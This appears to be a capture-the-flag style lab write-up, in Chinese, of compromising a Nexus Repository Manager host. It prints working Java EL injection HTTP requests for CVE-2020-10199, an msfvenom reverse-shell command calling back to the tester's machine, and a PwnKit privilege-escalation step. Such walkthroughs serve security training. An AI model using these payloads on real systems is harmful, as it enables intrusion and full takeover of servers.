## Nmap
```bash
sudo nmap -A -sV -sS -T4 -iL target
```
```json
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-17 22:46 CST
Nmap scan report for 192.168.167.159
Host is up (0.38s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE  SERVICE VERSION
23/tcp   closed telnet
8081/tcp open   http    Jetty 9.4.18.v20190429
| http-robots.txt: 2 disallowed entries
|_/repository/ /service/
|_http-title: Nexus Repository Manager
|_http-server-header: Nexus/3.21.1-01 (OSS)
Aggressive OS guesses: Linux 2.6.32 (88%), Linux 2.6.32 or 3.10 (88%), Linux 2.6.39 (88%), Linux 3.10 - 3.12 (88%), Linux 3.4 (88%), Linux 3.5 (88%), Linux 4.2 (88%), Linux 4.4 (88%), Synology DiskStation Manager 5.1 (88%), WatchGuard Fireware 11.8 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops

TRACEROUTE (using port 23/tcp)
HOP RTT       ADDRESS
1   416.73 ms 192.168.45.1
2   416.73 ms 192.168.45.254
3   416.79 ms 192.168.251.1
4   416.86 ms 192.168.167.159

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.59 seconds
```

searchsploit 沒找到有用的 payload

<!--重連 VPN，IP 換成 192.168.242.159-->

嘗試用 nc 連線 23 port
```bash
> nc 192.168.242.159 23
```
```json
====================
NEXUS BACKUP MANAGER
====================
ANSONE 	Answer question one
ANSTWO 	Answer question two
BACKUP 	Perform backup
EXIT 	Exit
HELP 	Show help
HINT 	Show hints
RECOVER	Recover admin password
RESTORE	Restore backup
```
```bash
HINT
```
```json
HINT
1.What is your zodiac sign?
2.What is your favorite color?
```
暴力破解後
```bash
> RECOVER
RECOVER <password>
> blackleo
3e409e89-514c-4f9f-955e-dfa5c4083518
```
得到 admin password
用 admin password 登入並用 burp 記錄封包

獲得 password 後嘗試使用 searachsploit 49385.py 攻擊但失敗 (應是引號等格式原因)

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/PG/sona]
└─$ cat 49385.py
# Exploit Title: Sonatype Nexus 3.21.1 - Remote Code Execution (Authenticated)
# Exploit Author: 1F98D
# Original Author: Alvaro Muñoz
# Date: 27 May 2020
# Vendor Hompage: https://www.sonatype.com/
# CVE: CVE-2020-10199
# Tested on: Windows 10 x64
# References:
# https://securitylab.github.com/advisories/GHSL-2020-011-nxrm-sonatype
# https://securitylab.github.com/advisories/GHSL-2020-011-nxrm-sonatype
#
# Nexus Repository Manager 3 versions 3.21.1 and below are vulnerable
# to Java EL injection which allows a low privilege user to remotely
# execute code on the target server.
```

透過該檔案發現對應到 CVE-2020-10199，搜尋後發現是 JavaEL Injection 漏洞，故去 hacktricks 查詢
[hacktricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/el-expression-language)

對應到 49385.py 之內容，嘗試使用 burp 客製封包

```http
POST /service/rest/beta/repositories/go/group HTTP/1.1
Host: 192.168.242.159:8081
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Nexus-UI: true
NX-ANTI-CSRF-TOKEN: 0.3174503825726208
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 280
Origin: http://192.168.242.159:8081
Connection: close
Referer: http://192.168.242.159:8081/
Cookie: NX-ANTI-CSRF-TOKEN=0.3174503825726208; NXSESSIONID=2cc57008-fe76-4bc9-ae07-13f622869575

{"name": "internal", "online": "true",
             "storage": {"blobStoreName": "default", "strictContentTypeValidation": "true"},
             "group": {"memberNames": ["${\"\".getClass().forName(\"java.lang.Runtime\").getMethods()[6].invoke(null).exec(\"pwd\")}"]}}
```

成功達成 RCE
接著使用 msfvenom 製造 reverse shell 

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.158 LPORT=4444 -f elf > reverse.elf
```

上傳到靶機後執行

```http
POST /service/rest/beta/repositories/go/group HTTP/1.1
Host: 192.168.242.159:8081
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Nexus-UI: true
NX-ANTI-CSRF-TOKEN: 0.3174503825726208
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 280
Origin: http://192.168.242.159:8081
Connection: close
Referer: http://192.168.242.159:8081/
Cookie: NX-ANTI-CSRF-TOKEN=0.3174503825726208; NXSESSIONID=2cc57008-fe76-4bc9-ae07-13f622869575

{"name": "internal", "online": "true",
             "storage": {"blobStoreName": "default", "strictContentTypeValidation": "true"},
             "group": {"memberNames": ["${\"\".getClass().forName(\"java.lang.Runtime\").getMethods()[6].invoke(null).exec(\"./reverse.elf\")}"]}}
```

## 提權

上傳 linpeas.sh 並執行，發現可遭 CVE-2021-4034 利用

```json
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: probable
   Tags: [ ubuntu=(20.04) ]{kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
```

搜尋相關 PoC，找到 [Github](https://github.com/joeammond/CVE-2021-4034)
下載後上傳至靶機執行，成功提權
